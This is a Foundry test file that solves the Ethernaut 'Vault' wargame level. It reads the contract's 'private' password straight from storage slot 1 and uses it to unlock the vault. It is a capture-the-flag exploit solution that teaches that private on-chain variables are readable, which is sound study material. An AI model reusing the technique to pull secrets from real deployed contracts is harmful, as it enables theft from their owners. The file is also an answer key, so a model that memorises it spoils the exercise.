// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.36;

import {Test} from "forge-std/Test.sol";
import {Vault} from "ethernaut/contracts/src/levels/Vault.sol";
import {VaultFactory} from "ethernaut/contracts/src/levels/VaultFactory.sol";

contract VaultTest is Test {
    address public immutable player = makeAddr("player");
    VaultFactory public factory;
    Vault public level;

    function setUp() public {
        factory = new VaultFactory();
        level = Vault(factory.createInstance(player));
    }

    function test_exploit_Vault() public {
        assert(level.locked());
        bytes32 pos = bytes32(uint256(1));
        bytes32 password = vm.load(address(level), pos);
        level.unlock(password);
        assert(factory.validateInstance(payable(address(level)), player));
    }
}
